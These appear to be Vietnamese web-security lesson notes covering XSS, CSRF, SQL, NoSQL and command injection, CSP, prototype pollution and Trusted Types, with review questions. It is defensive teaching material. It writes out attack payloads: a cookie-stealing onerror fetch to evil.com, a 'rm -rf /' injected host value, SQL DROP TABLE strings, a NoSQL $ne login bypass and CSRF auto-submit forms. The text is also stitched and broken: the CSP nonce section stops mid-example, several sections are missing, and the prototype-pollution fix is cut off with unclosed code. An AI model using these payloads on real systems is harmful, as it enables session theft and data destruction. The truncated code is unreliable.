# Phase 6.1 — Common Vulnerabilities

> **Đề xuất phân chia:** Nội dung này đủ rộng để chia 2–3 buổi. Buổi này sẽ cover đầy đủ tất cả từ 🔴 đến 🟢, nhưng XSS + CSP + Prototype Pollution là những phần sâu nhất — đây là nơi tôi sẽ đầu tư nhiều nhất.

---

## Tổng quan trước khi học

Security ở tầng Senior không phải là "biết tên lỗ hổng". Nó là hiểu **tại sao lỗ hổng tồn tại ở tầng browser/engine**, và **tại sao cách fix này đúng còn cách kia chỉ che đậy**. Mỗi vulnerability đều có một root cause ở tầng thấp.

```
Root cause map:

XSS          → Browser tin tưởng content trong DOM quá mức
CSRF         → Browser tự động gửi cookies kèm mọi request
Injection    → String interpolation trực tiếp vào query/command
Clickjacking → Browser render iframe của origin khác mà không kiểm soát
Open Redirect→ Server/client redirect mà không validate destination
Proto Pollution → Object.prototype là shared, mutable global state
```

## 1. XSS — Cross-Site Scripting

### 1.1 Cơ chế thật

XSS tồn tại vì một quyết định thiết kế cốt lõi của browser: **HTML parser không phân biệt "data" và "code"**. Khi browser nhận một chuỗi HTML, nó parse toàn bộ — bao gồm bất kỳ `<script>` nào xuất hiện trong đó — mà không hỏi "chuỗi này đến từ đâu".

Browser's HTML parser pipeline:

```
Raw bytes
    ↓
Tokenizer  → Tạo tokens: StartTag, EndTag, Character, Comment, DOCTYPE
    ↓
Tree Construction Algorithm → Xây dựng DOM tree
    ↓
Script execution
```

Tokenizer **không có khái niệm về "trusted" vs "untrusted" content**. Nó chỉ biết: "đây là tag", "đây là attribute", "đây là text". Khi nó gặp `<script>`, nó chuyển sang "script data state" và feed content vào JS engine. **Không có bước nào kiểm tra content đến từ user hay developer.**

Đây là tại sao XSS nguy hiểm: attacker không cần bypass JS — họ chỉ cần khiến parser "nhìn thấy" một `<script>` tag hoặc event handler.

---

### 1.2 Ba loại XSS — cơ chế khác nhau hoàn toàn

#### Reflected XSS

```
Flow:
Attacker craft URL → Victim click → Server phản chiếu input vào HTML → Browser parse và execute
```

```
URL: https://search.example.com?q=<script>document.cookie</script>

Server-side (Node.js — vulnerable):
app.get('/search', (req, res) => {
  const query = req.query.q;
  // Server nhúng thẳng query vào HTML template
  // HTML parser sẽ gặp <script> tag và execute nó
  res.send(`<h1>Kết quả cho: ${query}</h1>`);
});

Browser nhận:
<h1>Kết quả cho: <script>document.cookie</script></h1>
↓
Parser gặp <script> tag
↓
V8 execute: document.cookie → gửi cookie về server của attacker
```

Payload không cần chạy qua server của attacker — nó được phản chiếu ngay trong response của victim server.

---

#### Stored XSS

```
Flow:
Attacker POST payload → Lưu vào DB → Victim load page → Server lấy payload từ DB nhúng vào HTML → Execute
```

```javascript
// Comment section — vulnerable
// Attacker post comment:
// Content: <img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// Server lấy từ DB và render:
app.get('/post/:id', async (req, res) => {
  const comments = await db.query(
    'SELECT content FROM comments WHERE post_id = ?',
    [req.params.id],
  );

  const commentsHtml = comments
    .map((c) => `<div class="comment">${c.content}</div>`) // ← VULNERABILITY
    .join('');

  res.send(`<div class="comments">${commentsHtml}</div>`);
});

// Khi victim load page:
// <div class="comment">
//   <img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
// </div>
//
// Browser try load image src="x" → fail → trigger onerror → execute JS
// Tất cả victim đều bị ảnh hưởng mỗi khi load page
```

Stored XSS nguy hiểm hơn Reflected vì không cần victim click link đặc biệt — chỉ cần visit page bình thường.

#### DOM-based XSS

Đây là loại khó nhất và hay bị bỏ qua nhất. Payload **không bao giờ đi qua server** — nó tồn tại hoàn toàn trong browser.

```
Flow:
Attacker craft URL với fragment (#) → Victim click → JS client-side đọc location.hash
→ Ghi vào DOM → Browser parse và execute
(Server không nhìn thấy gì cả — # không được gửi lên server)
```

```javascript
// Vulnerable SPA code
// URL: https://app.com/profile#<img src=x onerror=alert(1)>

// Cách XSS phổ biến nhất trong SPA hiện đại
const hash = location.hash.slice(1); // <img src=x onerror=alert(1)>

// VULNERABLE SINKS — những điểm ghi vào DOM:
document.getElementById('output').innerHTML = hash; // ← SINK 1
document.write(hash); // ← SINK 2
element.insertAdjacentHTML('beforeend', hash); // ← SINK 3
eval(hash); // ← SINK 4
new Function(hash)(); // ← SINK 5
setTimeout(hash, 0); // ← SINK 6

// SOURCES — những nơi attacker có thể inject:
// location.hash, location.search, location.href
// document.referrer
// window.name
// postMessage data
// localStorage (nếu attacker đã từng control storage)
```

**Source → Sink model:** DOM XSS xảy ra khi dữ liệu chảy từ một **source** (input có thể bị control bởi attacker) đến một **sink** (API ghi content vào DOM hoặc execute code) mà không qua sanitization.

---

### 1.3 Tại sao innerHTML là sink nguy hiểm nhất

```javascript
// Khi bạn gán innerHTML, browser chạy full HTML parse pipeline:
element.innerHTML = userInput;

// Pipeline:
// 1. Tokenizer scan chuỗi
// 2. Khi gặp <script> → script được parse (nhưng KHÔNG execute — đây là exception đặc biệt)
// 3. Khi gặp event handler (onerror, onload, onclick...) → VẪN execute
// 4. Khi gặp javascript: href → VẪN execute khi user click

// Tại sao <script> qua innerHTML không execute nhưng onerror thì có?
// Spec quy định: script elements inserted via innerHTML are NOT executed
// Nhưng event handlers là attribute của elements → browser register chúng bình thường

// Ví dụ:
element.innerHTML = '<script>alert(1)</script>'; // KHÔNG execute
element.innerHTML = '<img src=x onerror=alert(1)>'; // EXECUTE
element.innerHTML = '<svg onload=alert(1)>'; // EXECUTE
element.innerHTML = '<a href="javascript:alert(1)">x</a>'; // EXECUTE khi click
```

---

### 1.4 Fix — cơ chế thật sự

#### Fix 1: Encode output (không dùng innerHTML)

```javascript
// BAD:
element.innerHTML = userInput;

// GOOD: textContent chỉ set text node, không parse HTML
element.textContent = userInput;
// Browser tạo Text node thay vì parse HTML
// "< > &" được treat là literal characters, không phải HTML entities

// GOOD: createElement + set properties
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);
```

#### Fix 2: DOMPurify — sanitization library

```javascript
import DOMPurify from 'dompurify';

// DOMPurify parse HTML, xây DOM tree, remove dangerous elements/attributes
// rồi serialize lại thành safe HTML string
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
  // Force all links to open in new tab (prevent javascript: href)
  ADD_ATTR: ['target'],
});

element.innerHTML = clean;

// Cơ chế bên trong DOMPurify:
// 1. Parse input thành DOM (trong một isolated context)
// 2. Walk DOM tree
// 3. Remove disallowed tags, attributes, event handlers
// 4. Serialize back to string
// 5. Parse lại để verify (double parse để catch mXSS)
```

#### Fix 3: Server-side — escape theo context

```javascript
// Escape rules khác nhau theo context:

// HTML context: escape 5 characters
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;') // Phải escape & trước tiên
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// JS context (trong <script> block): JSON.stringify
const data = JSON.stringify(userInput); // escape quotes, backslashes

// URL context: encodeURIComponent
const url = `https://example.com/search?q=${encodeURIComponent(userInput)}`;

// CSS context: cực kỳ cẩn thận — không cho phép user input vào CSS nếu có thể
// CSS có thể execute JS qua expression(), url() trong IE và các quirks khác
```

## 2. CSRF — Cross-Site Request Forgery

### 2.1 Cơ chế thật

CSRF khai thác một behavior baked sâu vào HTTP spec: **browser tự động đính kèm cookies của một origin vào mọi request đến origin đó**, bất kể request đó được initiate từ đâu.

```
Victim đang đăng nhập bank.com
Cookie: session=abc123 (đang được lưu trong browser)

Victim visit evil.com
evil.com có HTML:
<img src="https://bank.com/transfer?to=attacker&amount=10000">

Browser thấy <img> tag → tự động gửi GET request tới bank.com
→ Browser tự động đính kèm cookie session=abc123
→ bank.com nhận request hợp lệ với session của victim
→ Transfer thực hiện
```

```
Evil page load sequence:

Browser đang có:       evil.com HTML:
┌──────────────┐       ┌──────────────────────────────────────┐
│ Cookies:     │       │ <form action="https://bank.com/      │
│ bank.com:    │       │   transfer" method="POST">           │
│   session=   │       │   <input name="to" value="attacker"> │
│   abc123     │       │   <input name="amount" value="10000">│
└──────────────┘       │ </form>                              │
                       │ <script>document.forms[0].submit()   │
                       │ </script>                            │
                       └──────────────────────────────────────┘
                                    ↓
                       Browser submit form tới bank.com
                       với cookie session=abc123 đính kèm tự động
```

CSRF không steal credential. Nó **impersonate** victim bằng cách exploit việc browser là "credential carrier" tự động.

### 2.2 Fix: SameSite Cookie

SameSite attribute thay đổi cách browser quyết định có gửi cookie không:

```
SameSite=Strict:
  Cookie CHỈ được gửi khi navigation đến từ CÙNG SITE
  (same registrable domain — eTLD+1)

  evil.com → bank.com request: Cookie KHÔNG được gửi
  bank.com → bank.com request: Cookie được gửi

  Nhược điểm: Nếu user click link từ email đến bank.com → không có cookie
  → Phải login lại → UX kém

SameSite=Lax (default từ Chrome 80):
  Cookie được gửi trong top-level navigation với safe methods (GET)
  Cookie KHÔNG được gửi trong cross-site subrequests (img, form POST, fetch)

  evil.com → bank.com GET navigation: Cookie được gửi (top-level navigation)
  evil.com → bank.com POST form: Cookie KHÔNG được gửi
  evil.com → bank.com img/fetch: Cookie KHÔNG được gửi

SameSite=None; Secure:
  Cookie được gửi trong tất cả cross-site requests
  Phải có Secure attribute (chỉ HTTPS)
  Dùng cho: third-party auth widgets, embedded content
```

```javascript
// Node.js Express — set cookie đúng cách
res.cookie('sessionId', sessionToken, {
  httpOnly: true, // JS không thể đọc (chống XSS steal cookie)
  secure: true, // Chỉ HTTPS
  sameSite: 'strict', // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  path: '/',
});

// Tại sao httpOnly + sameSite cần cả hai?
// httpOnly: chống XSS đọc cookie value
// sameSite: chống CSRF dùng cookie để forge request
// Chúng bảo vệ ở hai threat model khác nhau
```

### 2.3 Fix: CSRF Token

```javascript
// Server generate token cho mỗi session
// Token được nhúng vào HTML form (không phải cookie)
// Request phải include token → attacker từ evil.com không thể đọc HTML của bank.com
// vì Same-Origin Policy

// Server (Express + csurf pattern):
const crypto = require('crypto');

function generateCsrfToken(sessionId) {
  // Token gắn với session — không thể tái sử dụng across sessions
  return crypto
    .createHmac('sha256', process.env.CSRF_SECRET)
    .update(sessionId)
    .digest('hex');
}

// Trong HTML form:
// <input type="hidden" name="_csrf" value="{{ csrfToken }}">

// Middleware verify:
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next(); // Safe methods không cần CSRF protection
  }

  const token = req.body._csrf || req.headers['x-csrf-token'];
  const expected = generateCsrfToken(req.session.id);

  if (!crypto.timingSafeEqual(Buffer.from(token), Buffer.from(expected))) {
    // timingSafeEqual: prevent timing attacks
    // Regular === comparison: "abc" vs "abd" → có thể infer từ timing
    return res.status(403).send('CSRF token invalid');
  }

  next();
});
```

**Tại sao CSRF token work?** Same-Origin Policy ngăn evil.com đọc HTML từ bank.com. Do đó evil.com không thể đọc CSRF token được nhúng trong form, và không thể include nó trong forged request.

## 3. Injection Attacks

### 3.1 SQL Injection — cơ chế

Root cause: **string concatenation trực tiếp vào query** → attacker inject SQL syntax.

```javascript
// VULNERABLE — attacker control query structure
async function getUser(username) {
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  // username = "admin' OR '1'='1"
  // Query trở thành:
  // SELECT * FROM users WHERE username = 'admin' OR '1'='1'
  // '1'='1' luôn true → return tất cả users

  // username = "admin'; DROP TABLE users; --"
  // SELECT * FROM users WHERE username = 'admin';
  // DROP TABLE users;
  // -- (comment, ignore phần còn lại)

  return db.query(query);
}

// FIX: Parameterized queries (prepared statements)
async function getUser(username) {
  // DB driver tách query structure và data
  // DB parse query template trước, rồi bind data vào
  // Data không bao giờ được interpret như SQL syntax
  const query = 'SELECT * FROM users WHERE username = ?';
  return db.query(query, [username]);

  // Cơ chế bên trong:
  // 1. DB receives: "SELECT * FROM users WHERE username = ?"
  // 2. DB compile query plan (structure cố định)
  // 3. DB bind value: username = "admin' OR '1'='1"
  // 4. DB treat toàn bộ username string như một literal value
  //    → không có SQL injection possible
}

// PostgreSQL (node-postgres):
const result = await client.query(
  'SELECT * FROM users WHERE username = $1 AND status = $2',
  [username, 'active'],
);

// Knex.js query builder (tự động parameterize):
const user = await knex('users')
  .where({ username: username, status: 'active' })
  .first();
// Knex generate: SELECT * FROM users WHERE username = ? AND status = ?
// với bindings array riêng
```

### 3.2 NoSQL Injection

NoSQL không có SQL nhưng vẫn có injection — payload là object thay vì string.

```javascript
// MongoDB — VULNERABLE
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Nếu request body là JSON:
  // { "username": { "$ne": null }, "password": { "$ne": null } }
  // → query trở thành:
  // db.users.findOne({ username: { $ne: null }, password: { $ne: null } })
  // → match user đầu tiên trong collection → login thành công với bất kỳ user nào

  const user = await User.findOne({ username, password }); // VULNERABLE

  if (user) {
    // Logged in as arbitrary user
  }
});

// FIX 1: Validate types — đảm bảo username/password là string
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Type check trước khi query
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).send('Invalid input');
  }

  // Sanitize: strip MongoDB operators
  const safeUsername = username.replace(/[$]/g, '');

  const user = await User.findOne({ username: safeUsername });
  // Compare password với bcrypt — không dùng password trực tiếp trong query
  if (user && (await bcrypt.compare(password, user.passwordHash))) {
    // Login success
  }
});

// FIX 2: Dùng mongoose schema validation
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
});
// Mongoose cast input theo schema type → object với $ne không pass type validation

// FIX 3: Express middleware validate input (joi, zod)
const loginSchema = z.object({
  username: z.string().min(1).max(50),
  password: z.string().min(1).max(100),
});

app.post('/login', async (req, res) => {
  const { username, password } = loginSchema.parse(req.body);
  // Nếu input không phải string → zod throw ValidationError trước khi query
});
```

### 3.3 Command Injection

```javascript
// Node.js child_process — VULNERABLE
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;

  // host = "google.com; rm -rf /"
  // Command trở thành: ping google.com; rm -rf /
  // ; là command separator trong shell

  exec(`ping -c 1 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
});

// FIX: Dùng execFile thay vì exec — không spawn shell
const { execFile } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;

  // Validate format trước
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).send('Invalid host');
  }

  // execFile không spawn shell → không có shell metacharacters
  // Arguments được pass trực tiếp tới OS — không interpret bởi shell
  execFile('ping', ['-c', '1', host], (err, stdout) => {
    res.send(stdout);
  });

  // Khác biệt:
  // exec('ping -c 1 google.com') → spawn /bin/sh -c 'ping -c 1 google.com'
  //   → shell interpret toàn bộ string → injection possible
  // execFile('ping', ['-c', '1', 'google.com']) → OS exec('ping', args[])
  //   → không qua shell → injection impossible
});
```

## 4. Content Security Policy (CSP)

### 4.1 Cơ chế thật

CSP là một HTTP response header. Khi browser nhận header này, nó build một **policy enforcement object** và áp dụng nó vào toàn bộ page load. Browser maintain một whitelist — bất kỳ resource hay script execution nào không khớp với policy → bị block.

```
Server response:
HTTP/1.1 200 OK
Content-Security-Policy: script-src 'self' https://cdn.example.com; style-src 'self'

Browser nhận header:
┌─────────────────────────────────────────────────────┐
│ CSP Policy Object:                                   │
│   script-src: ['self', 'https://cdn.example.com']   │
│   style-src:  ['self']                               │
│   default-src: *  (fallback nếu directive không có) │
└─────────────────────────────────────────────────────┘

Khi parser gặp:
<script src="/app.js">    → origin là 'self' → ALLOWED
<script src="https://cdn.example.com/lib.js"> → ALLOWED
<script src="https://evil.com/payload.js">    → BLOCKED
<script>alert(1)</script>                     → BLOCKED (inline script)
<div onclick="evil()">                        → BLOCKED (inline event handler)
```

---

### 4.2 CSP Directives

```javascript
// Production CSP — strict

Content-Security-Policy:
  default-src 'none';           // Block everything by default
  script-src 'self'             // Scripts: only from same origin
    https://cdn.trusted.com     // + whitelisted CDN
    'nonce-{RANDOM}';           // + inline scripts với nonce
  style-src 'self'
    'nonce-{RANDOM}';
  img-src 'self'
    data:                       // Allow data: URIs cho images
    https://images.trusted.com;
  connect-src 'self'
    https://api.example.com;    // fetch/XHR chỉ đến đây
  font-src 'self'
    https://fonts.gstatic.com;
  frame-ancestors 'none';       // Chống clickjacking — không cho iframe
  base-uri 'self';              // Chống base tag injection
  form-action 'self';           // Form chỉ submit đến same origin
  upgrade-insecure-requests;    // Tự động upgrade HTTP → HTTPS
  report-uri /csp-violation;    // Báo cáo vi phạm về server

// Tại sao 'unsafe-inline' phá vỡ XSS protection:
// Nếu có 'unsafe-inline' → inline scripts được allow
// → Attacker inject <script>alert(1)</script> → execute
// → CSP không còn giá trị bảo vệ XSS nữa
```

### 4.3 Nonce — cách dùng đúng

```javascript
// Server generate nonce mới cho MỖI request (không thể predict, không thể reuse)
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate cryptographically random nonce
  const nonce = crypto.randomBytes(16).toString('base64');

  // Set CSP header với nonce
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`,
  );

  // Pass nonce tới template
  res.locals.nonce = nonce;
  next();
});

// Template (EJS):
```

## 8. Prototype Pollution

### 8.1 Cơ chế thật — đây là phần sâu nhất

JavaScript có một đặc điểm unique: **mọi object đều share một prototype chain chung** thông qua `Object.prototype`. Nếu attacker có thể modify `Object.prototype`, toàn bộ application bị ảnh hưởng.

```javascript
// Object.prototype là root của prototype chain:
const obj = {};
obj.__proto__ === Object.prototype; // true
Object.getPrototypeOf(obj) === Object.prototype; // true

// Object.prototype là SHARED — mọi object đều inherit từ nó
const a = {};
const b = {};
a.__proto__ === b.__proto__; // true — cùng một object

// Nếu ai đó modify Object.prototype:
Object.prototype.isAdmin = true;

// Tất cả objects trong application đột nhiên có property isAdmin:
const user = { name: 'regular user' };
user.isAdmin; // true — từ prototype chain, không phải own property
```

---

### 8.2 Làm sao attacker trigger prototype pollution

```javascript
// Pattern phổ biến nhất: recursive merge/clone function

function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]); // ← recursive call
    } else {
      target[key] = source[key]; // ← VULNERABILITY
    }
  }
  return target;
}

// Attacker gửi JSON:
// { "__proto__": { "isAdmin": true } }
//
// deepMerge({}, { "__proto__": { "isAdmin": true } })
// key = "__proto__"
// source["__proto__"] = { "isAdmin": true } → object → recurse
// deepMerge(target["__proto__"], { "isAdmin": true })
//   target["__proto__"] → Object.prototype (vì target.__proto__ === Object.prototype)
//   key = "isAdmin"
//   Object.prototype["isAdmin"] = true  ← POLLUTION HAPPENS HERE
//
// Sau đó:
const user = {};
user.isAdmin; // true — prototype pollution
```

```javascript
// FIX 1: Validate key trong merge function
function safeDeepMerge(target, source) {
  for (const key of Object.keys(source)) {

    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue; // Skip

    if (source[key] && typeof source[key] === 'object') {
```

```javascript
// Generate SRI hash trong Node.js
const crypto = require('crypto');

function generateSRI(filePath, algorithm = 'sha384') {
  const content = fs.readFileSync(filePath);
  const hash = crypto.createHash(algorithm).update(content).digest('base64');
  return `${algorithm}-${hash}`;
}

const integrity = generateSRI('./public/app.js');

// Dùng trong HTML:
```

## 10. Trusted Types API

### 10.1 Cơ chế — phòng DOM XSS ở tầng platform

Trusted Types là browser API force code phải đi qua "trust factory" trước khi gán vào dangerous sinks. Thay vì rely vào developer nhớ sanitize mọi chỗ, browser **từ chối nhận string thường tại các sinks**.

```javascript
// Enable via CSP header:
Content-Security-Policy: require-trusted-types-for 'script'

// Sau khi enable, browser BLOCK các assignment này:
element.innerHTML = '<b>Hello</b>';           // TypeError
element.innerHTML = userInput;                 // TypeError
// Browser yêu cầu TrustedHTML object, không phải string thường

// Tạo Trusted Types policy:
const policy = trustedTypes.createPolicy('main-policy', {
  createHTML: (input) => {
    // Đây là nơi duy nhất tạo TrustedHTML
    // Phải sanitize tại đây
    return DOMPurify.sanitize(input);
  },
  createScriptURL: (input) => {
    // Validate URL trước khi dùng
    const url = new URL(input, window.location.origin);
    if (url.origin !== window.location.origin) {
      throw new Error('Only same-origin scripts allowed');
    }
    return input;
  },
});

// Dùng policy:
element.innerHTML = policy.createHTML(userInput);
// createHTML return TrustedHTML object → browser chấp nhận

// Tại sao Trusted Types mạnh hơn manual sanitization?
// Manual: Developer phải nhớ sanitize ở MỌI nơi gán innerHTML
// Trusted Types: Browser enforce ở tầng platform → không thể quên
// Security tập trung tại policy factory → dễ audit hơn
```

## Câu hỏi ôn tập

---

**Câu 1 — Tại sao DOM-based XSS nguy hiểm hơn Reflected XSS về mặt detection?**

**Đáp án:**

DOM-based XSS nguy hiểm hơn về detection vì payload **không bao giờ đi lên server**. Với Reflected XSS, payload đi qua HTTP request → server logs có thể capture → WAF (Web Application Firewall) có thể scan và block. Với DOM-based XSS, payload nằm trong `location.hash` (phần sau `#` trong URL) — browser **không gửi fragment lên server**, fragment chỉ tồn tại trong browser. Do đó:

- Server logs hoàn toàn không thấy payload
- WAF không thể intercept
- Chỉ client-side code review và static analysis mới phát hiện được
- Các sinks nguy hiểm: `innerHTML`, `eval`, `document.write`, `setTimeout(string)`

Fix cần thiết ở tầng code: không bao giờ gán URL-derived data vào dangerous sinks mà không sanitize. Trusted Types enforce điều này ở tầng platform.

**Câu 2 — Đoạn code này có vấn đề gì? Fix như thế nào?**

```javascript
function deepClone(obj) {
  return JSON.parse(JSON.stringify(obj));
}

function applyUserSettings(defaults, userSettings) {
  const merged = {};
  for (const key in userSettings) {
    if (typeof userSettings[key] === 'object') {
      merged[key] = deepClone(userSettings[key]);
    } else {
      merged[key] = userSettings[key];
    }
  }
  return { ...defaults, ...merged };
}

// User gửi: { "__proto__": { "isAdmin": true }, "theme": "dark" }
applyUserSettings({ theme: 'light' }, userInput);
```

**Đáp án:**

Vấn đề: `for...in` loop iterate **tất cả enumerable properties kể cả inherited**. Khi `userSettings` có key `"__proto__"`, loop gặp nó. `userSettings["__proto__"]` là `{ "isAdmin": true }` → đây là object → `deepClone` tạo `{ "isAdmin": true }`. Sau đó `merged["__proto__"] = { "isAdmin": true }`.

Gán `merged["__proto__"]` không trực tiếp pollute, nhưng vấn đề sâu hơn: `deepClone` dùng `JSON.parse(JSON.stringify())` — với object có `__proto__` key, `JSON.stringify` serialize nó thành `{"__proto__":{"isAdmin":true}}`, `JSON.parse` tạo object literal với key `"__proto__"` literal (string key, không phải prototype access). Đây là safe.

Tuy nhiên code vẫn có vấn đề khác: `for...in` cần được thay bằng `Object.keys()` (chỉ own enumerable). Nếu `userSettings` được tạo từ object bị pollute trước đó, `for...in` sẽ iterate properties polluted từ prototype.

Fix:

```javascript
function applyUserSettings(defaults, userSettings) {
  // Object.keys: chỉ own enumerable properties, không inherited
  const safeKeys = Object.keys(userSettings).filter(
    (key) =>
      key !== '__proto__' && key !== 'constructor' && key !== 'prototype',
  );

  const merged = Object.create(null); // No prototype chain
  for (const key of safeKeys) {
    merged[key] =
      typeof userSettings[key] === 'object'
        ? structuredClone(userSettings[key]) // ES2022 — deep clone safe
        : userSettings[key];
  }
  return { ...defaults, ...merged };
}
```

**Câu 3 — Tại sao SameSite=Lax không đủ để bảo vệ hoàn toàn khỏi CSRF? Khi nào cần thêm CSRF token?**

**Đáp án:**

`SameSite=Lax` cho phép cookie được gửi trong **top-level navigation với GET method**. Điều này tạo attack surface cho CSRF qua GET requests:

```
Nếu server thực hiện state-changing operation qua GET:
https://bank.com/transfer?to=attacker&amount=1000

Attacker tạo link:
<a href="https://bank.com/transfer?to=attacker&amount=1000">Click me</a>

Victim click → top-level GET navigation → SameSite=Lax KHÔNG block → cookie được gửi
→ Transfer thực hiện
```

Ngoài ra, `SameSite=Lax` có **120-second grace period** trong một số browser (đặc biệt Chrome cũ): ngay sau khi cookie được set, nó được gửi ngay cả cross-site POST trong 120 giây đầu. Window này có thể bị exploit.

Khi nào cần CSRF token thêm:

1. Khi server có bất kỳ state-changing GET endpoint nào (không nên có, nhưng legacy code)
2. Khi cần defense-in-depth (security không nên single point of failure)
3. Khi app hỗ trợ browsers cũ không có `SameSite` support
4. Khi cookie được set bởi third-party (không control được SameSite)

Best practice: **cả hai** — `SameSite=Strict` + CSRF token, không phải either/or. SameSite là browser-level enforcement; CSRF token là application-level enforcement.
